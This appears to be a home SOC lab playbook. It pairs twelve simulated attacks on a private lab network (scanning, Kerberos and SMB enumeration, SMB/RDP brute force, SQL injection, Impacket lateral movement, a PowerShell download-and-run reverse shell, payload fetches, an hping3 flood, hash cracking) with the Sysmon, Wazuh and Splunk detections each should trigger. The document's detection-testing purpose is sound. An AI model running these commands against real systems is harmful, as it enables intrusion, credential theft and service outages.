# **6.1 Network Reconnaissance (Nmap)**

## **Goal**

Identify active hosts & open ports in the SOC LAN.

## **Technique**

- Reconnaissance
    
- Service Discovery
    
- Network Scanning
    

## **Attacker Commands (Kali)**

```
nmap -sn 192.168.10.0/24
nmap -sV -sC -O 192.168.10.20
nmap -sV -sC 192.168.10.50
```

## **Target Prep**

None

## **Expected Detection**

- Sysmon Event ID 3 (network)
    
- Wazuh “Port scanning activity”
    
- Splunk correlation spike
    

---

# **6.2 Windows Domain Username Enumeration (Kerbrute)**

## **Goal**

Enumerate valid AD usernames.

## **Technique**

- Account Discovery
    
- Kerberos Enumeration
    

## **Attacker Commands (Kali)**

```
kerbrute userenum users.txt -d phoanhhai.local --dc 192.168.10.20
```

## **Target Prep**

✔ Enable AD audit policy (Success + Failure)  
✔ Ensure weak/guessable usernames exist

## **Expected Detection**

- Event ID 4768 / 4771 (Kerberos)
    
- Wazuh MITRE ATT&CK T1087 (Account Discovery)
    

---

# **6.3 SMB Enumeration (enum4linux, smbclient, smbmap)**

## **Tools**

`enum4linux`, `smbclient`, `smbmap`

## **Attacker Commands (Kali)**

```
enum4linux -a 192.168.10.20

smbclient -L //192.168.10.20/
smbmap -H 192.168.10.20
```

## **Target Prep**

✔ Create a share on DC: `C:\PublicShare`  
✔ Permissions: Everyone → Read

## **Expected Detection**

- Event ID 4624 (logon)
    
- Event ID 5140 (SMB share enumeration)
    
- Wazuh “SMB enumeration attempt”
    

---

# **6.4 SMB Brute Force (Hydra + SMB)**

## **Goal**

Password attacks on DC or POS.

## **Technique**

- Credential Access
    
- Brute Force (SMB)
    

## **Attacker Commands (Kali)**

```
hydra -L users.txt -P passwords.txt smb://192.168.10.20
crackmapexec smb 192.168.10.20 -u users.txt -p passwords.txt
```

## **Target Prep**

✔ Disable account lockout temporarily  
✔ Use weak passwords: `Password1`, `Pho2025!`, etc.

## **Expected Detection**

- Event ID 4625 spike
    
- Wazuh brute-force rule (T1110)
    

---

# **6.5 RDP Brute Force (Hydra)**

## **Tools**

`hydra`

## **Attacker Commands (Kali)**

```
hydra -L users.txt -P passwords.txt rdp://192.168.10.50
```

## **Target Prep**

✔ Enable RDP in System → Remote Desktop  
✔ Allow inbound RDP (3389) in firewall

## **Expected Detection**

- Event ID 4625 (failed RDP)
    
- Wazuh brute-force alerts
    
- High failed login count in Splunk
    

---

# **6.6 Web App Scanning / Directory Discovery (Gobuster, Wfuzz, Nikto)**

_(Only if POS or DC hosts a simple HTTP server)_

## **Tools**

`gobuster`, `wfuzz`, `nikto`

## **Attacker Commands (Kali)**

```
gobuster dir -u http://192.168.10.50 -w /usr/share/seclists/Discovery/Web-Content/common.txt
nikto -h http://192.168.10.50
```

## **Target Prep**

✔ Install IIS or Python SimpleHTTPServer on POS:

```
python3 -m http.server 80
```

## **Expected Detection**

- Sysmon Event ID 3 (mass scanning)
    
- Wazuh → Reconnaissance detection
    

---

# **6.7 SQL Injection Testing (SQLmap)**

_(Only if a web app exists on POS)_

## **Tools**

`sqlmap`

## **Attacker Commands (Kali)**

```
sqlmap -u "http://192.168.10.50/login.php?user=1" --batch --dbs
```

## **Target Prep**

✔ Install DVWA or vulnerable PHP app  
✔ Weak DB credentials (e.g., `root:root`)

## **Expected Detection**

- Traffic anomalies
    
- Sysmon network logs
    
- Application log errors (if enabled)
    

---

# **6.8 Lateral Movement (Impacket – psexec, smbexec, wmiexec)**

## **Tools**

`impacket-psexec`, `impacket-wmiexec`

## **Attacker Commands (Kali)**

```
psexec.py phoanhhai.local/user:Password1@192.168.10.20
wmiexec.py phoanhhai.local/user:Password1@192.168.10.50
```

## **Target Prep**

✔ Enable ADMIN$ share  
✔ Attacker must have valid credentials

## **Expected Detection**

- Event ID 4624 (Type 3)
    
- Event ID 4672 (special privileges)
    
- Sysmon Event ID 1 (psexec service creation)
    
- Wazuh MITRE T1021, T1569
    

---

# **6.9 Reverse Shell Delivery (nc + PowerShell)**

## **Tools**

`netcat`, PowerShell

## **Attacker Commands (Kali)**

**Listener:**

```
nc -lvnp 4444
```

**On Windows Target:**

```
powershell -c "Invoke-WebRequest http://192.168.10.X/shell.ps1 -OutFile shell.ps1"
powershell -c "./shell.ps1"
```

## **Expected Detection**

- Sysmon network connection
    
- Sysmon suspicious PowerShell
    
- Wazuh MITRE T1059 (Command Execution)
    

---

# **6.10 File Transfer & Enumeration (curl, wget)**

## **Tools**

`curl`, `wget`

## **Attacker Commands (Kali)**

```
wget http://192.168.10.X/evil.exe
curl http://192.168.10.X/payload -o payload.exe
```

## **Target Prep**

✔ Host files using:

```
python3 -m http.server 80
```

## **Expected Detection**

- Sysmon Event ID 11 (FileCreate)
    
- Wazuh → FIM & suspicious file detection
    

---

# **6.11 DOS & Traffic Flooding (hping3)**

## **Tools**

`hping3`

## **Attacker Commands (Kali)**

```
sudo hping3 -S --flood -p 80 192.168.10.50
```

## **Target Prep**

✔ Ensure POS runs a web service (optional)

## **Expected Detection**

- High network traffic
    
- Sysmon network spam
    
- Wazuh anomalous behaviour alerts
    

---

# **6.12 Password Cracking (John, Hashcat)**

## **Goal**

Practice offline password cracking.

## **Tools**

`john`, `hashcat`

## **Attacker Commands (Kali)**

```
john hash.txt
hashcat -m 1000 hashes.txt rockyou.txt
```

## **Target Prep**

✔ Extract NTLM hashes via Impacket’s `secretsdump.py`

## **Expected Detection**

No on-host logs (offline attack).  
Demonstrates post-exploitation workflow.